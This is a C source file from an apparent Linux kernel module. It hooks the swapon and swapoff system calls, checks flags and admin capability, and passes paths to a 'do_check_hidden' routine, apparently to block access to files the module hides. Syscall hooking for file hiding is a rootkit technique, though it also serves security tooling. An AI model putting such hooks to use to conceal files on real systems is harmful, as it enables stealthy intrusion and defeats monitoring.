#include "files.h"
#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <asm-generic/errno-base.h>
#include <linux/capability.h>
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/swap.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_swapon syscall hook handler
SYSCALL_HOOK_HANDLER2(swapon, orig_swapon, p_regs, const char __user *, s_specialfile, int,
                      i32_swap_flags)
{
    pr_dev_info("swapon(%p, %s%#x)\n", s_specialfile, SIGNED_ARG(i32_swap_flags));

    if (i32_swap_flags & ~SWAP_FLAGS_VALID) {
        return -EINVAL;
    }

    if (!capable(CAP_SYS_ADMIN)) {
        return -EPERM;
    }

    return do_check_hidden(orig_swapon, p_regs, AT_FDCWD, s_specialfile, 0);
}

// sys_swapoff syscall hook handler
SYSCALL_HOOK_HANDLER1(swapoff, orig_swapoff, p_regs, const char __user *, s_specialfile)
{
    pr_dev_info("swapoff(%p)\n", s_specialfile);

    if (!capable(CAP_SYS_ADMIN)) {
        return -EPERM;
    }

    return do_check_hidden(orig_swapoff, p_regs, AT_FDCWD, s_specialfile, 0);
}
